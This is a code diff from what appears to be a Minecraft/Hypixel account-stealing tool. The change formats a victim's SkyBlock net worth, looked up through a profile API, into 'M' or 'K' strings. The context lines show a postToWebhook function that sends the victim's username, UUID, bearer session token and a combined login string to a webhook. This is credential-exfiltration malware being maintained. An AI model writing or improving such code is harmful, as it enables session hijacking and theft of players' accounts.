@@ -130,7 +130,18 @@ async function checkNetworth(name){
     }
     const url = `https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${name}`
     const response = await axios.get(url, config)
-    return response.data['networth']['unsoulboundNetworth']
+    let networth = response.data['networth']['unsoulboundNetworth']
+
+    if (networth / 1000000 >= 1) {
+        networth = networth / 1000000
+        networth = networth.toFixed(2)
+        networth = networth + 'M'
+    } else if (networth / 1000 > 1) {
+        networth = networth / 1000
+        networth = networth.toFixed(2)
+        networth = networth + 'K'
+    }
+    return networth
 }
 
 function postToWebhook(username, bearerToken, uuid, networth) {
@@ -143,7 +154,7 @@ function postToWebhook(username, bearerToken, uuid, networth) {
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
-                {name: "ELT", value: networth / 1000000 + "M", inline: true},
+                {name: "ELT", value: networth, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
                 {name: "Login", value: username + ":" + uuid + ":"    + bearerToken, inline: true},
             ]
